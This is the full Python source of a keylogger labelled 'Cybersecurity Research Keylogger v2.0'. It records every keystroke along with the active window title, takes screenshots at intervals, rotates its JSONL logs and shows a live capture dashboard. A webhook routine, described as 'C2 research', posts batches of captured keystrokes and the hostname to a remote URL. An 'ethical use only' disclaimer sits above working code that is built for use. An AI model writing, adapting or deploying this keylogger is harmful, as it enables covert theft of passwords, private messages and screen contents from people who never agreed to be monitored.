"""
Key.py — Cybersecurity Research Keylogger v2.0
===============================================
Features:
  - Real-time keyboard capture with microsecond timestamps
  - Active window tracking (Windows / macOS / Linux)
  - Log rotation at configurable size limit (default 5 MB)
  - F9 toggle: pause / resume capture at runtime
  - Webhook delivery simulation (C2 research)
  - Thread-safe operations with proper resource locking
  - [NEW] Colorized live CLI dashboard (stats, events/min, uptime)
  - [NEW] Periodic screenshot capture with timestamps

ETHICAL USE ONLY — only run on systems you own or have explicit
written permission to monitor. Unauthorised use is illegal.
"""

import os
import sys
import json
import time
import queue
import signal
import threading
import datetime
import platform
import logging
from pathlib import Path
from typing import Optional

# ── Third-party deps ──────────────────────────────────────────────────────────
try:
    from pynput import keyboard
except ImportError:
    sys.exit("[!] pynput not found — run: pip install pynput")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    # Fallback stubs so the rest of the code works without colorama
    class _Stub:
        def __getattr__(self, _): return ""
    Fore = Back = Style = _Stub()

try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

# ── Configuration ─────────────────────────────────────────────────────────────
CONFIG = {
    "log_dir":           Path("logs"),
    "log_basename":      "keylog",
    "screenshot_dir":    Path("logs/screenshots"),
    "screenshot_interval": 30,           # seconds between screenshots (0 = disabled)
    "max_log_size":      5 * 1024 * 1024,
    "flush_interval":    2.0,
    "webhook_url":       None,
    "webhook_batch":     20,
    "toggle_key":        keyboard.Key.f9,
    "dashboard_refresh": 1.0,            # seconds between dashboard updates
}

# ── Globals ───────────────────────────────────────────────────────────────────
_lock           = threading.Lock()
_event_queue    = queue.Queue()
_paused         = threading.Event()
_stop_event     = threading.Event()
_log_file: Optional[object] = None
_log_path: Optional[Path]   = None
_log_index      = 0
_webhook_buf    = []

# Stats counters
_stats = {
    "total_events":    0,
    "total_keys":      0,
    "screenshots":     0,
    "start_time":      time.time(),
    "last_key":        "",
    "last_window":     "",
    "events_this_min": 0,
    "min_start":       time.time(),
    "keys_per_min":    0,
}
_stats_lock = threading.Lock()

# Disable default logging output — we use the dashboard instead
logging.basicConfig(level=logging.CRITICAL)
log = logging.getLogger("keylogger")

# ── Colors / UI helpers ───────────────────────────────────────────────────────
C = {
    "title":   Fore.CYAN + Style.BRIGHT,
    "label":   Fore.WHITE + Style.DIM,
    "value":   Fore.GREEN + Style.BRIGHT,
    "warn":    Fore.YELLOW + Style.BRIGHT,
    "alert":   Fore.RED + Style.BRIGHT,
    "key":     Fore.MAGENTA + Style.BRIGHT,
    "window":  Fore.BLUE + Style.BRIGHT,
    "reset":   Style.RESET_ALL,
    "dim":     Style.DIM,
}

def _clear():
    os.system("cls" if platform.system() == "Windows" else "clear")

def _uptime() -> str:
    secs = int(time.time() - _stats["start_time"])
    h, r = divmod(secs, 3600)
    m, s = divmod(r, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"

def _draw_dashboard():
    """Redraw the live CLI dashboard."""
    with _stats_lock:
        total    = _stats["total_keys"]
        kpm      = _stats["keys_per_min"]
        shots    = _stats["screenshots"]
        last_key = _stats["last_key"]
        window   = _stats["last_window"][:55] if _stats["last_window"] else "—"
        paused   = _paused.is_set()

    status = f"{C['warn']}⏸  PAUSED" if paused else f"{C['value']}▶  CAPTURING"
    shot_status = f"{C['value']}ON  (every {CONFIG['screenshot_interval']}s)" if SCREENSHOT_AVAILABLE and CONFIG["screenshot_interval"] > 0 else f"{C['warn']}OFF"

    _clear()
    print(f"{C['title']}╔{'═'*58}╗")
    print(f"{C['title']}║{'  KEYLOGGER v2.0 — RESEARCH / EDUCATIONAL USE ONLY':^58}║")
    print(f"{C['title']}╚{'═'*58}╝{C['reset']}")
    print()
    print(f"  {C['label']}Status      {C['reset']}: {status}{C['reset']}")
    print(f"  {C['label']}Uptime      {C['reset']}: {C['value']}{_uptime()}{C['reset']}")
    print(f"  {C['label']}Host        {C['reset']}: {C['value']}{platform.node()}{C['reset']}")
    print(f"  {C['label']}OS          {C['reset']}: {C['value']}{platform.system()} {platform.release()}{C['reset']}")
    print()
    print(f"{C['title']}  ── Stats ──────────────────────────────────────────────{C['reset']}")
    print(f"  {C['label']}Keys logged {C['reset']}: {C['value']}{total:,}{C['reset']}")
    print(f"  {C['label']}Keys/min    {C['reset']}: {C['value']}{kpm}{C['reset']}")
    print(f"  {C['label']}Screenshots {C['reset']}: {C['value']}{shots}{C['reset']}  {shot_status}")
    print(f"  {C['label']}Log dir     {C['reset']}: {C['dim']}{CONFIG['log_dir'].resolve()}{C['reset']}")
    print()
    print(f"{C['title']}  ── Live Feed ───────────────────────────────────────────{C['reset']}")
    print(f"  {C['label']}Last key    {C['reset']}: {C['key']}{last_key:<20}{C['reset']}")
    print(f"  {C['label']}Window      {C['reset']}: {C['window']}{window}{C['reset']}")
    print()
    print(f"{C['title']}  ── Controls ────────────────────────────────────────────{C['reset']}")
    print(f"  {C['dim']}F9 = pause/resume    Ctrl+C = stop & save{C['reset']}")
    print()


# ── Active window helper ──────────────────────────────────────────────────────
def get_active_window() -> str:
    system = platform.system()
    try:
        if system == "Windows":
            import ctypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value or "Unknown"
        elif system == "Darwin":
            from AppKit import NSWorkspace  # type: ignore
            app = NSWorkspace.sharedWorkspace().activeApplication()
            return app.get("NSApplicationName", "Unknown")
        elif system == "Linux":
            import subprocess
            result = subprocess.run(
                ["xdotool", "getactivewindow", "getwindowname"],
                capture_output=True, text=True, timeout=0.3,
            )
            return result.stdout.strip() or "Unknown"
    except Exception:
        pass
    return "Unknown"


# ── Log file management ───────────────────────────────────────────────────────
def _open_new_log() -> None:
    global _log_file, _log_path, _log_index
    CONFIG["log_dir"].mkdir(parents=True, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    _log_path = CONFIG["log_dir"] / f"{CONFIG['log_basename']}_{ts}_{_log_index:03d}.jsonl"
    _log_file = _log_path.open("a", encoding="utf-8")
    _log_index += 1

def _rotate_if_needed() -> None:
    if _log_file and _log_path and _log_path.stat().st_size >= CONFIG["max_log_size"]:
        _log_file.close()
        _open_new_log()

def _write_entry(entry: dict) -> None:
    global _log_file
    if _log_file is None:
        _open_new_log()
    _log_file.write(json.dumps(entry) + "\n")
    _rotate_if_needed()


# ── Screenshot capture ────────────────────────────────────────────────────────
def _screenshot_thread() -> None:
    """Capture a screenshot every N seconds."""
    if not SCREENSHOT_AVAILABLE or CONFIG["screenshot_interval"] <= 0:
        return

    CONFIG["screenshot_dir"].mkdir(parents=True, exist_ok=True)

    while not _stop_event.wait(timeout=CONFIG["screenshot_interval"]):
        if _paused.is_set():
            continue
        try:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            path = CONFIG["screenshot_dir"] / f"screen_{ts}.png"
            img = ImageGrab.grab()
            img.save(str(path))
            with _stats_lock:
                _stats["screenshots"] += 1
        except Exception:
            pass


# ── Webhook delivery ──────────────────────────────────────────────────────────
def _send_webhook(events: list) -> None:
    if not REQUESTS_AVAILABLE or not CONFIG["webhook_url"]:
        return
    payload = {"source": platform.node(), "events": events}
    try:
        requests.post(CONFIG["webhook_url"], json=payload, timeout=5)
    except Exception:
        pass


# ── Writer thread ─────────────────────────────────────────────────────────────
def _writer_thread() -> None:
    global _webhook_buf

    while not _stop_event.is_set() or not _event_queue.empty():
        batch = []
        deadline = time.monotonic() + CONFIG["flush_interval"]
        while time.monotonic() < deadline:
            try:
                entry = _event_queue.get(timeout=0.1)
                batch.append(entry)
                if len(batch) >= 50:
                    break
            except queue.Empty:
                break

        if not batch:
            continue

        with _lock:
            for entry in batch:
                _write_entry(entry)
            _log_file.flush()

        if CONFIG["webhook_url"]:
            _webhook_buf.extend(batch)
            if len(_webhook_buf) >= CONFIG["webhook_batch"]:
                threading.Thread(
                    target=_send_webhook, args=(_webhook_buf[:],), daemon=True
                ).start()
                _webhook_buf = []

    with _lock:
        if _log_file:
            _log_file.flush()
            _log_file.close()

    if _webhook_buf and CONFIG["webhook_url"]:
        _send_webhook(_webhook_buf)


# ── Dashboard thread ──────────────────────────────────────────────────────────
def _dashboard_thread() -> None:
    """Refresh the live dashboard every second."""
    while not _stop_event.is_set():
        _draw_dashboard()
        time.sleep(CONFIG["dashboard_refresh"])


# ── Keyboard listener callbacks ───────────────────────────────────────────────
_last_window  = ""
_window_check = 0.0

def _make_entry(event_type: str, key) -> dict:
    global _last_window, _window_check

    now = time.time()
    if now - _window_check > 1.0:
        _last_window  = get_active_window()
        _window_check = now

    try:
        key_str = key.char if hasattr(key, "char") and key.char else f"[{key.name}]"
    except AttributeError:
        key_str = f"[{key}]"

    return {
        "ts":     datetime.datetime.utcnow().isoformat() + "Z",
        "ts_us":  time.time(),
        "type":   event_type,
        "key":    key_str,
        "window": _last_window,
        "host":   platform.node(),
        "os":     platform.system(),
    }


def on_press(key) -> None:
    if key == CONFIG["toggle_key"]:
        if _paused.is_set():
            _paused.clear()
        else:
            _paused.set()
        return

    if _paused.is_set():
        return

    entry = _make_entry("press", key)
    _event_queue.put(entry)

    # Update stats
    with _stats_lock:
        _stats["total_events"] += 1
        _stats["total_keys"]   += 1
        _stats["last_key"]      = entry["key"]
        _stats["last_window"]   = entry["window"]
        _stats["events_this_min"] += 1

        # Reset keys/min counter every 60s
        elapsed = time.time() - _stats["min_start"]
        if elapsed >= 60:
            _stats["keys_per_min"]    = _stats["events_this_min"]
            _stats["events_this_min"] = 0
            _stats["min_start"]       = time.time()
        else:
            # Live approximation
            _stats["keys_per_min"] = int(_stats["events_this_min"] / max(elapsed, 1) * 60)


def on_release(key) -> None:
    if _paused.is_set():
        return
    _event_queue.put(_make_entry("release", key))


# ── Graceful shutdown ─────────────────────────────────────────────────────────
def _shutdown(signum=None, frame=None) -> None:
    _stop_event.set()

signal.signal(signal.SIGINT,  _shutdown)
signal.signal(signal.SIGTERM, _shutdown)


# ── Entry point ───────────────────────────────────────────────────────────────
def main() -> None:
    if not COLORAMA_AVAILABLE:
        print("[!] colorama not found — run: pip install colorama")
    if not SCREENSHOT_AVAILABLE:
        print("[!] Pillow not found — screenshots disabled. run: pip install pillow")

    # Start threads
    threads = [
        threading.Thread(target=_writer_thread,    daemon=False, name="writer"),
        threading.Thread(target=_dashboard_thread, daemon=True,  name="dashboard"),
        threading.Thread(target=_screenshot_thread,daemon=True,  name="screenshots"),
    ]
    for t in threads:
        t.start()

    # Keyboard listener (blocks until stop)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        _stop_event.wait()
        listener.stop()

    threads[0].join(timeout=10)  # wait for writer to flush

    _clear()
    print(f"\n{C['value']}✔  Session complete.{C['reset']}")
    print(f"  Keys logged  : {_stats['total_keys']:,}")
    print(f"  Screenshots  : {_stats['screenshots']}")
    print(f"  Uptime       : {_uptime()}")
    print(f"  Logs saved to: {CONFIG['log_dir'].resolve()}\n")


if __name__ == "__main__":
    main()